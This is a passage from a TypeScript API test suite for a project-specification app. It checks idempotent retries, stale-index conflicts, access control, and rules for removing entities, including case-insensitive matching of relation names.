      method: "PATCH",
      headers,
      body: JSON.stringify({ role: "Renamed Role", expect: original }),
    });
    assert.equal(
      retryRes.status,
      200,
      "a retried rename with the same idempotency key must replay the original success, not a stale-index conflict against the now-already-renamed role",
    );
    const { project: afterRetry } = (await retryRes.json()) as { project: { spec: { roles: string[] } } };
    assert.deepEqual(afterRetry.spec.roles, afterFirst.spec.roles, "the replayed response must match the original success exactly");
  });
});

test("DELETE .../assumptions/:index retried with the same idempotency key after the first attempt already succeeded replays the original 200, instead of a stale-index conflict", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "assumption-remove-idem@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { assumptions: string[] } } };
    assert.ok(project.spec.assumptions.length >= 1);
    const first = project.spec.assumptions[0];

    const headers = { ...authHeaders(token), "x-idempotency-key": "assumption-remove-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/assumptions/0`, {
      method: "DELETE",
      headers,
      body: JSON.stringify({ expect: first }),
    });
    assert.equal(firstRes.status, 200);
    const { project: afterFirst } = (await firstRes.json()) as { project: { spec: { assumptions: string[] } } };
    assert.ok(!afterFirst.spec.assumptions.includes(first), "the assumption must genuinely be gone after the first call");

    const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/assumptions/0`, {
      method: "DELETE",
      headers,
      body: JSON.stringify({ expect: first }),
    });
    assert.equal(
      retryRes.status,
      200,
      "a retried removal with the same idempotency key must replay the original success, not a stale-index conflict on the already-removed assumption",
    );
    const { project: afterRetry } = (await retryRes.json()) as { project: { spec: { assumptions: string[] } } };
    assert.deepEqual(afterRetry.spec.assumptions, afterFirst.spec.assumptions, "the replayed response must match the original success exactly");
  });
});

test("PATCH .../assumptions/:index retried with the same idempotency key after the first attempt already succeeded replays the original 200, instead of a stale-index conflict", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "assumption-rename-idem@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { assumptions: string[] } } };
    const original = project.spec.assumptions[0];

    const headers = { ...authHeaders(token), "x-idempotency-key": "assumption-rename-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/assumptions/0`, {
      method: "PATCH",
      headers,
      body: JSON.stringify({ assumption: "Renamed Assumption", expect: original }),
    });
    assert.equal(firstRes.status, 200);
    const { project: afterFirst } = (await firstRes.json()) as { project: { spec: { assumptions: string[] } } };
    assert.equal(afterFirst.spec.assumptions[0], "Renamed Assumption", "the assumption must genuinely be renamed after the first call");

    const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/assumptions/0`, {
      method: "PATCH",
      headers,
      body: JSON.stringify({ assumption: "Renamed Assumption", expect: original }),
    });
    assert.equal(
      retryRes.status,
      200,
      "a retried rename with the same idempotency key must replay the original success, not a stale-index conflict against the now-already-renamed assumption",
    );
    const { project: afterRetry } = (await retryRes.json()) as { project: { spec: { assumptions: string[] } } };
    assert.deepEqual(afterRetry.spec.assumptions, afterFirst.spec.assumptions, "the replayed response must match the original success exactly");
  });
});

test("DELETE .../personas/:index retried with the same idempotency key after the first attempt already succeeded replays the original 200, instead of a stale-index conflict", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "persona-remove-idem@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const addRes = await fetch(`${baseUrl}/api/projects/${project.id}/personas`, {
      method: "POST",
      headers: { ...authHeaders(token), "x-idempotency-key": "persona-seed-key" },
      body: JSON.stringify({ persona: "Busy small-business owner" }),
    });
    const { project: withPersona } = (await addRes.json()) as { project: { spec: { personas: string[] } } };
    const index = withPersona.spec.personas.length - 1;
    const first = withPersona.spec.personas[index];

    const headers = { ...authHeaders(token), "x-idempotency-key": "persona-remove-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/personas/${index}`, {
      method: "DELETE",
      headers,
      body: JSON.stringify({ expect: first }),
    });
    assert.equal(firstRes.status, 200);
    const { project: afterFirst } = (await firstRes.json()) as { project: { spec: { personas: string[] } } };
    assert.ok(!afterFirst.spec.personas.includes(first), "the persona must genuinely be gone after the first call");

    const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/personas/${index}`, {
      method: "DELETE",
      headers,
      body: JSON.stringify({ expect: first }),
    });
    assert.equal(
      retryRes.status,
      200,
      "a retried removal with the same idempotency key must replay the original success, not a stale-index conflict on the already-removed persona",
    );
    const { project: afterRetry } = (await retryRes.json()) as { project: { spec: { personas: string[] } } };
    assert.deepEqual(afterRetry.spec.personas, afterFirst.spec.personas, "the replayed response must match the original success exactly");
  });
});

test("PATCH .../personas/:index retried with the same idempotency key after the first attempt already succeeded replays the original 200, instead of a stale-index conflict", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "persona-rename-idem@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const addRes = await fetch(`${baseUrl}/api/projects/${project.id}/personas`, {
      method: "POST",
      headers: { ...authHeaders(token), "x-idempotency-key": "persona-seed-key-2" },
      body: JSON.stringify({ persona: "Busy small-business owner" }),
    });
    const { project: withPersona } = (await addRes.json()) as { project: { spec: { personas: string[] } } };
    const index = withPersona.spec.personas.length - 1;
    const original = withPersona.spec.personas[index];

    const headers = { ...authHeaders(token), "x-idempotency-key": "persona-rename-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/personas/${index}`, {
      method: "PATCH",
      headers,
      body: JSON.stringify({ persona: "Renamed Persona", expect: original }),
    });
    assert.equal(firstRes.status, 200);
    const { project: afterFirst } = (await firstRes.json()) as { project: { spec: { personas: string[] } } };
    assert.equal(afterFirst.spec.personas[index], "Renamed Persona", "the persona must genuinely be renamed after the first call");

    const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/personas/${index}`, {
      method: "PATCH",
      headers,
      body: JSON.stringify({ persona: "Renamed Persona", expect: original }),
    });
    assert.equal(
      retryRes.status,
      200,
      "a retried rename with the same idempotency key must replay the original success, not a stale-index conflict against the now-already-renamed persona",
    );
    const { project: afterRetry } = (await retryRes.json()) as { project: { spec: { personas: string[] } } };
    assert.deepEqual(afterRetry.spec.personas, afterFirst.spec.personas, "the replayed response must match the original success exactly");
  });
});

test("deleting an assumption at a now-stale index is rejected (409) instead of silently removing the wrong assumption", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "assumption-stale-index1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { assumptions: string[] } } };
    assert.ok(project.spec.assumptions.length >= 2, "the heuristic engine always generates at least 3 default assumptions");
    const [first, second] = project.spec.assumptions;

    const firstRemoval = await fetch(`${baseUrl}/api/projects/${project.id}/assumptions/0`, {
      method: "DELETE",
      headers: authHeaders(token),
      body: JSON.stringify({ expect: first }),
    });
    assert.equal(firstRemoval.status, 200);

    const staleRemoval = await fetch(`${baseUrl}/api/projects/${project.id}/assumptions/1`, {
      method: "DELETE",
      headers: authHeaders(token),
      body: JSON.stringify({ expect: second }),
    });
    assert.equal(staleRemoval.status, 409);
    assert.equal(((await staleRemoval.json()) as { code?: string }).code, "ASSUMPTION_STALE_INDEX");

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: afterBoth } = (await getRes.json()) as { project: { spec: { assumptions: string[] } } };
    assert.ok(afterBoth.spec.assumptions.includes(second), "the assumption the user actually clicked to remove must survive the rejected stale request");
  });
});

/**
 * Round 775: `personas` is the one spec-level string[] (ProductSpecSchema,
 * alongside roles/assumptions) that had no API-level add/remove/rename
 * routes at all until this round, and therefore no UI either (see
 * SpecListItemRemover.tsx's own PersonaItem/AddPersonaForm comment). These
 * mirror the equivalent roles/assumptions tests above exactly, since the
 * three new routes are a direct copy of the assumptions routes' own shape
 * (no `.min(1)` floor, same idempotency/stale-index machinery).
 */
test("POST /projects/:id/personas retried with the same idempotency key after the first attempt already finished replays the original response instead of appending a second persona", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "persona-idem1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { personas: string[] } } };
    const originalCount = project.spec.personas.length;

    const headers = { ...authHeaders(token), "x-idempotency-key": "persona-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/personas`, {
      method: "POST",
      headers,
      body: JSON.stringify({ persona: "A support agent triaging incoming tickets." }),
    });
    assert.equal(firstRes.status, 200);
    const first = (await firstRes.json()) as { project: { spec: { personas: string[] } } };
    assert.equal(first.project.spec.personas.length, originalCount + 1);

    const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/personas`, {
      method: "POST",
      headers,
      body: JSON.stringify({ persona: "A support agent triaging incoming tickets." }),
    });
    assert.equal(retryRes.status, 200);
    const retry = (await retryRes.json()) as { project: { spec: { personas: string[] } } };
    assert.deepEqual(
      retry.project.spec.personas,
      first.project.spec.personas,
      "the retry must replay the original response, not append a second persona",
    );
  });
});

test("the owner can remove a persona by index, and a collaborator can too -- the remaining personas keep their own relative order", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "persona-remove-owner1@example.com");
    const collabToken = await signup(baseUrl, "persona-remove-collab1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({
        description: "A CRM with customers and deals, used by a sales manager and a customer portal for self-service.",
      }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { personas: string[] } } };
    assert.ok(project.spec.personas.length >= 3, "the heuristic engine always generates one persona per role");
    const originalPersonas = project.spec.personas;
    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "persona-remove-collab1@example.com" }),
    });

    const ownerRes = await fetch(`${baseUrl}/api/projects/${project.id}/personas/1`, {
      method: "DELETE",
      headers: authHeaders(ownerToken),
    });
    assert.equal(ownerRes.status, 200);
    const { project: afterFirstRemoval } = (await ownerRes.json()) as { project: { spec: { personas: string[] } } };
    assert.deepEqual(
      afterFirstRemoval.spec.personas,
      [originalPersonas[0], ...originalPersonas.slice(2)],
      "removing index 1 must drop only the middle persona, keeping the others in their original order",
    );

    const collabRes = await fetch(`${baseUrl}/api/projects/${project.id}/personas/0`, {
      method: "DELETE",
      headers: authHeaders(collabToken),
    });
    assert.equal(collabRes.status, 200);
    const { project: afterSecondRemoval } = (await collabRes.json()) as { project: { spec: { personas: string[] } } };
    assert.deepEqual(
      afterSecondRemoval.spec.personas,
      originalPersonas.slice(2),
      "a collaborator can remove a persona too, same as the owner",
    );
  });
});

test("removing a persona at an out-of-range index 404s with PERSONA_NOT_FOUND, and the personas list is left untouched", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "persona-remove-owner2@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { personas: string[] } } };

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/personas/${project.spec.personas.length}`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(res.status, 404);
    assert.equal(((await res.json()) as { code?: string }).code, "PERSONA_NOT_FOUND");

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: unchanged } = (await getRes.json()) as { project: { spec: { personas: string[] } } };
    assert.deepEqual(unchanged.spec.personas, project.spec.personas);
  });
});

test("removing a persona on a project you have no access to still 404s, the same as any other project route", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "persona-remove-owner3@example.com");
    const outsiderToken = await signup(baseUrl, "persona-remove-outsider3@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/personas/0`, {
      method: "DELETE",
      headers: authHeaders(outsiderToken),
    });
    assert.equal(res.status, 404);
  });
});

test("the owner can rename a persona by index in place, and a collaborator can too -- renaming never changes the array's own length or order", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "persona-rename-owner1@example.com");
    const collabToken = await signup(baseUrl, "persona-rename-collab1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({
        description: "A CRM with customers and deals, used by a sales manager and a customer portal for self-service.",
      }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { personas: string[] } } };
    assert.ok(project.spec.personas.length >= 3, "the heuristic engine always generates one persona per role");
    const originalPersonas = project.spec.personas;
    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "persona-rename-collab1@example.com" }),
    });

    const ownerRes = await fetch(`${baseUrl}/api/projects/${project.id}/personas/0`, {
      method: "PATCH",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ persona: "Busy small-business owner managing everything solo" }),
    });
    assert.equal(ownerRes.status, 200);
    const { project: afterFirstRename } = (await ownerRes.json()) as { project: { spec: { personas: string[] } } };
    assert.deepEqual(
      afterFirstRename.spec.personas,
      ["Busy small-business owner managing everything solo", ...originalPersonas.slice(1)],
      "renaming index 0 must replace only that persona in place, at the same position",
    );

    const collabRes = await fetch(`${baseUrl}/api/projects/${project.id}/personas/1`, {
      method: "PATCH",
      headers: authHeaders(collabToken),
      body: JSON.stringify({ persona: "Renamed by collaborator" }),
    });
    assert.equal(collabRes.status, 200);
    const { project: afterSecondRename } = (await collabRes.json()) as { project: { spec: { personas: string[] } } };
    assert.equal(
      afterSecondRename.spec.personas.length,
      originalPersonas.length,
      "renaming must never change the list's length",
    );
    assert.equal(
      afterSecondRename.spec.personas[1],
      "Renamed by collaborator",
      "a collaborator can rename a persona too, same as the owner",
    );
  });
});

test("renaming a persona at an out-of-range index 404s with PERSONA_NOT_FOUND, and the personas list is left untouched", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "persona-rename-owner2@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { personas: string[] } } };

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/personas/${project.spec.personas.length}`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ persona: "Anything" }),
    });
    assert.equal(res.status, 404);
    assert.equal(((await res.json()) as { code?: string }).code, "PERSONA_NOT_FOUND");

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: unchanged } = (await getRes.json()) as { project: { spec: { personas: string[] } } };
    assert.deepEqual(unchanged.spec.personas, project.spec.personas);
  });
});

test("renaming a persona on a project you have no access to still 404s, the same as any other project route", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "persona-rename-owner3@example.com");
    const outsiderToken = await signup(baseUrl, "persona-rename-outsider3@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/personas/0`, {
      method: "PATCH",
      headers: authHeaders(outsiderToken),
      body: JSON.stringify({ persona: "Hijacked persona" }),
    });
    assert.equal(res.status, 404);
  });
});

test("deleting a persona at a now-stale index is rejected (409) instead of silently removing the wrong persona", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "persona-stale-index1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({
        description: "A CRM with customers and deals, used by a sales manager and a customer portal for self-service.",
      }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { personas: string[] } } };
    assert.ok(project.spec.personas.length >= 3);
    const [first, second] = project.spec.personas;

    const firstRemoval = await fetch(`${baseUrl}/api/projects/${project.id}/personas/0`, {
      method: "DELETE",
      headers: authHeaders(token),
      body: JSON.stringify({ expect: first }),
    });
    assert.equal(firstRemoval.status, 200);

    const staleRemoval = await fetch(`${baseUrl}/api/projects/${project.id}/personas/1`, {
      method: "DELETE",
      headers: authHeaders(token),
      body: JSON.stringify({ expect: second }),
    });
    assert.equal(staleRemoval.status, 409);
    assert.equal(((await staleRemoval.json()) as { code?: string }).code, "PERSONA_STALE_INDEX");

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: afterBoth } = (await getRes.json()) as { project: { spec: { personas: string[] } } };
    assert.ok(afterBoth.spec.personas.includes(second), "the persona the user actually clicked to remove must survive the rejected stale request");
  });
});

test("renaming a persona at a now-stale index is rejected (409) instead of silently renaming the wrong persona", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "persona-stale-rename1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({
        description: "A CRM with customers and deals, used by a sales manager and a customer portal for self-service.",
      }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { personas: string[] } } };
    assert.ok(project.spec.personas.length >= 3);
    const [first, second] = project.spec.personas;

    const firstRemoval = await fetch(`${baseUrl}/api/projects/${project.id}/personas/0`, {
      method: "DELETE",
      headers: authHeaders(token),
      body: JSON.stringify({ expect: first }),
    });
    assert.equal(firstRemoval.status, 200);

    const staleRename = await fetch(`${baseUrl}/api/projects/${project.id}/personas/1`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ persona: "Oops wrong one", expect: second }),
    });
    assert.equal(staleRename.status, 409);
    assert.equal(((await staleRename.json()) as { code?: string }).code, "PERSONA_STALE_INDEX");

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: afterBoth } = (await getRes.json()) as { project: { spec: { personas: string[] } } };
    assert.ok(afterBoth.spec.personas.includes(second), "the persona the user actually clicked to rename must survive untouched");
    assert.ok(!afterBoth.spec.personas.includes("Oops wrong one"), "the stale-indexed rename must not have been applied to any persona");
  });
});

/**
 * New in this round: the spec review screen's "entities" list (the
 * screens about to be built) had no correction path at all, unlike roles
 * and assumptions above -- an unwanted screen the heuristic invented could
 * only be removed by hoping a free-text build request talked it out of
 * existence. Removes by entityName (not index) since that's the real,
 * stable identifier every other route addresses an entity by.
 */
test("the owner can remove an entity from the spec by name, and a collaborator can too, leaving the other entities untouched", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "entity-remove-owner1@example.com");
    const collabToken = await signup(baseUrl, "entity-remove-collab1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({
        description:
          "Build an appointment-management application for a beauty clinic. I need customers, appointments, employees, services, an admin dashboard and automatic appointment status tracking.",
      }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    assert.ok(project.spec.entities.length >= 3, "this description should match several unrelated domain entities");
    const originalNames = project.spec.entities.map((e) => e.name);
    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "entity-remove-collab1@example.com" }),
    });

    const toRemove = originalNames[0];
    const ownerRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${toRemove}`, {
      method: "DELETE",
      headers: authHeaders(ownerToken),
    });
    assert.equal(ownerRes.status, 200);
    const { project: afterFirstRemoval } = (await ownerRes.json()) as { project: { spec: { entities: { name: string }[] } } };
    assert.deepEqual(
      afterFirstRemoval.spec.entities.map((e) => e.name),
      originalNames.filter((n) => n !== toRemove),
      "removing one entity must drop only that entity, keeping the rest in their original order",
    );

    const secondToRemove = originalNames[1];
    const collabRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${secondToRemove}`, {
      method: "DELETE",
      headers: authHeaders(collabToken),
    });
    assert.equal(collabRes.status, 200);
    const { project: afterSecondRemoval } = (await collabRes.json()) as { project: { spec: { entities: { name: string }[] } } };
    assert.deepEqual(
      afterSecondRemoval.spec.entities.map((e) => e.name),
      originalNames.filter((n) => n !== toRemove && n !== secondToRemove),
      "a collaborator can remove an entity too, same as the owner",
    );
  });
});

test("removing an entity name that doesn't exist in the spec 404s with ENTITY_NOT_FOUND, and the entities list is left untouched", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "entity-remove-owner2@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities/NoSuchEntity`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(res.status, 404);
    assert.equal(((await res.json()) as { code?: string }).code, "ENTITY_NOT_FOUND");

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: unchanged } = (await getRes.json()) as { project: { spec: { entities: { name: string }[] } } };
    assert.deepEqual(unchanged.spec.entities, project.spec.entities);
  });
});

/**
 * Round 941: the sibling POST (add entity) route already got
 * withIdempotency protection; this DELETE route never did. A response
 * lost in transit after the entity was already removed means
 * fetchWithWakeRetry's retry lands on spec state that no longer has
 * that entity, and the route's own "no such entity" check used to run
 * on every call (including the retry) -- throwing ENTITY_NOT_FOUND for
 * a removal that, from the user's point of view, already fully
 * succeeded. Mirrors round 792's own identical fix/test shape for
 * record deletion.
 */
test("DELETE .../entities/:entityName retried with the same idempotency key after the first attempt already succeeded replays the original 200, instead of 404ing on the already-removed entity", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "entity-remove-idem@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    const originalNames = project.spec.entities.map((e) => e.name);
    assert.ok(originalNames.length >= 2, "expected the heuristic spec to generate at least two entities to safely remove one");
    const toRemove = originalNames[0];

    const headers = { ...authHeaders(token), "x-idempotency-key": "entity-remove-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${toRemove}`, { method: "DELETE", headers });
    assert.equal(firstRes.status, 200);
    const { project: afterFirst } = (await firstRes.json()) as { project: { spec: { entities: { name: string }[] } } };
    assert.ok(!afterFirst.spec.entities.some((e) => e.name === toRemove), "the entity must genuinely be gone after the first call");

    const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${toRemove}`, { method: "DELETE", headers });
    assert.equal(
      retryRes.status,
      200,
      "a retried removal with the same idempotency key must replay the original success, not 404 on the already-removed entity",
    );
    const { project: afterRetry } = (await retryRes.json()) as { project: { spec: { entities: { name: string }[] } } };
    assert.deepEqual(afterRetry.spec.entities, afterFirst.spec.entities, "the replayed response must match the original success exactly");
  });
});

test("removing entities down to the last remaining one is rejected with 400 instead of crashing -- ProductSpecSchema requires entities.min(1)", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "entity-remove-lastone@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    assert.equal(project.spec.entities.length, 2, "a plain CRM description matches exactly Customer and Deal");

    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${project.spec.entities[0].name}`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(firstRes.status, 200, "removing down to exactly one remaining entity must still succeed");

    const secondRes = await fetch(`${baseUrl}/api/projects/${project.id}/entities/${project.spec.entities[1].name}`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(secondRes.status, 400, "removing the very last entity must be rejected, not crash");
    assert.equal(((await secondRes.json()) as { code?: string }).code, "VALIDATION_ERROR");

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: unchanged } = (await getRes.json()) as { project: { spec: { entities: { name: string }[] } } };
    assert.equal(unchanged.spec.entities.length, 1, "the one remaining entity must survive the rejected attempt untouched");
  });
});

test("removing an entity that another entity's relation field still points to is rejected with ENTITY_HAS_DEPENDENT_RELATIONS, and neither entity changes", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "entity-remove-dependent@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ description: "A small courier delivery business." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string; spec: { entities: { name: string }[] } } };
    assert.deepEqual(
      project.spec.entities.map((e) => e.name).sort(),
      ["Courier", "Order"],
      "this description should match exactly Order (with a courierId relation) and Courier",
    );

    const res = await fetch(`${baseUrl}/api/projects/${project.id}/entities/Courier`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(res.status, 400);
    assert.equal(((await res.json()) as { code?: string }).code, "ENTITY_HAS_DEPENDENT_RELATIONS");

    const getRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { headers: authHeaders(token) });
    const { project: unchanged } = (await getRes.json()) as { project: { spec: { entities: { name: string }[] } } };
    assert.deepEqual(unchanged.spec.entities.map((e) => e.name).sort(), ["Courier", "Order"]);
  });
});

/**
 * Round 1180: the dependent-relation guard just above used to compare
 * `f.relationTo` to `req.params.entityName` with exact-case equality --
 * the sole remaining exact-case holdout in the live API's route layer
 * after rounds 1159-1178 fixed every other relationTo-resolution site
 * (migrate.ts, automations.ts, calendarFeed.ts, backup.ts, twin.ts,
 * routes/calendar.ts). An AI-generated spec's relationTo can legitimately
 * differ in letter case from the real target entity's declared name, so
 * this guard could be silently bypassed: deleting "Customer" while
 * another entity's relation field reads relationTo: "customer" would
 * succeed outright instead of being rejected, leaving the surviving
 * entity's relation field pointing at an entity that no longer exists at
 * all (a strictly worse outcome than the display-only bugs those earlier
 * rounds fixed). Seeds the spec directly (bypassing AI generation, whose
 * exact casing isn't deterministic) to construct the case mismatch.
 */
test("removing an entity that another entity's relation field still points to is rejected even when relationTo differs from the entity's name only by letter case", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `entity-remove-dependent-case-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;
    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [
        { name: "Customer", fields: [{ name: "fullName", type: "text", required: true }] },
        {
          name: "Order",
          fields: [
            { name: "item", type: "text", required: true },
            { name: "customer", type: "relation", relationTo: "customer", required: false },
          ],
        },
      ],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "CRM", description: "test", spec });

    const res = await fetch(`${baseUrl}/api/projects/${projectId}/entities/Customer`, {
      method: "DELETE",
      headers: authHeaders(token),
    });
    assert.equal(res.status, 400, "deletion must be rejected -- Order's relation field still points to Customer, just lowercase");
    assert.equal(((await res.json()) as { code?: string }).code, "ENTITY_HAS_DEPENDENT_RELATIONS");

    const getRes = await fetch(`${baseUrl}/api/projects/${projectId}`, { headers: authHeaders(token) });
    const { project: unchanged } = (await getRes.json()) as { project: { spec: { entities: { name: string }[] } } };
    assert.deepEqual(unchanged.spec.entities.map((e) => e.name).sort(), ["Customer", "Order"], "neither entity must have changed");
  });
});

/**
 * Round 1186: this route was the sole entity-level route in this file
 * that never went through the shared `findEntity` helper (round 1162's
 * own case-insensitive fallback) -- it reimplemented its own exact-case
 * existence check and removal filters against the raw URL path segment
 * instead. Round 1180 already touched this exact route (and this exact
 * function) to fix the identical bug class in its dependent-relation
 * guard, without noticing the surrounding existence check and filters
 * had the same gap. Before this round, a URL spelled with the entity's
 * OLD casing (the same real, recurring AI-generated-spec recasing
 * behavior established since round 988) threw a false 404
 * ENTITY_NOT_FOUND here, blocking a legitimate deletion outright, even
 * though the entity is plainly present under a different letter case.
 * Confirms the deletion still succeeds, and that the resolved entity's
